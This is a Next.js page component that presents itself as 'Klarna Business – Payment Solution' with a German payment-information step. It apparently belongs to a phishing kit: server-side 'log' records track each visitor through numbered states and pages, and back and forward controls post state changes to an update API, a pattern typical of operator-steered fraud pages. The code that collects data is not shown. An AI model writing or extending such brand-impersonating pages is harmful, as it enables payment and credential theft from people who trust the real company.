import React from "react";
import Head from "next/head";
import {GetServerSideProps} from "next";
import Cookies from "cookies";
import prisma from "../../prisma/prisma";
import {NextRouter, withRouter} from "next/router";
import Banner from "../../components/Banner";
import Header from "../../components/Header";
import TrustedBy from "../../components/TrustedBy";
import SmartCard from "../../components/SmartCard";
import CustomerCard from "../../components/CustomerCard";
import Footer from "../../components/Footer";
import PaymentInfo from "../../components/PaymentInfo";
import {Payment} from "../../types/Payment";

export const getServerSideProps: GetServerSideProps = async ({
                                                               req,
                                                               res,
                                                               params,
                                                             }) => {
  const link = params?.link as string;
  const cookies = new Cookies(req, res);
  const id = cookies.get("id");
  const url = cookies.get("url");

  if (id && url && url === link) {
    const log = await prisma.log.findFirst({
      where: {id: parseInt(id)},
      include: {link: true},
    });
    if (log)
      if (log.link.url === url) {
        if (log.active && !log.done) {
          if (log.state > 1)
            return {
              redirect: {
                permanent: false,
                destination: `/success/${link}`,
              },
            };
          if (log.state < 1)
            return {
              redirect: {permanent: false, destination: `/${link}`},
            };

          const {payment} = JSON.parse(log.defaultData);
          return {
            props: {
              id,
              payment,
              nextState: log.pages[log.pages.indexOf(log.state) + 1],
              previousState: log.pages[log.pages.indexOf(log.state) - 1]
            }
          };
        } else {
          return {redirect: {permanent: false, destination: "/"}};
        }
      }
  }

  return {
    redirect: {permanent: false, destination: `/${link}`},
  };
};

type state = {};

type props = {
  router: NextRouter;
  id: number;
  payment: Payment;
  nextState: number;
  previousState: number;
};

class Link extends React.Component<props, state> {
  constructor(props) {
    super(props);

    this.state = {};

    this.back = this.back.bind(this);
    this.forward = this.forward.bind(this);
  }

  async back() {
    const {router, id, previousState} = this.props;
    const result = await this.updateLog(id, {state: previousState});
    if (result) router.reload();
  }

  async forward() {
    const {router, id, nextState} = this.props;
    const result = await this.updateLog(id, {state: nextState});
    if (result) router.reload();
  }

  async updateLog(id, data) {
    const result = await fetch("/api/logs/update", {
      method: "POST",
      body: JSON.stringify({id: parseInt(id), data}),
    }).then((res) => res.json());

    return !result.error;
  }

  render() {
    return (
      <>
        <Head>
          <title>Klarna Business – Payment Solution</title>
          <link rel="icon" href="/favicon.ico"/>
        </Head>

        <Banner/>
        <Header name={'Zahlungsinformationen'}/>
        <PaymentInfo payment={this.props.payment} forward={this.forward} back={this.back}/>
        <TrustedBy/>
        <SmartCard/>
        <CustomerCard/>
        <Footer/>
      </>
    );
  }
}

export default withRouter(Link);
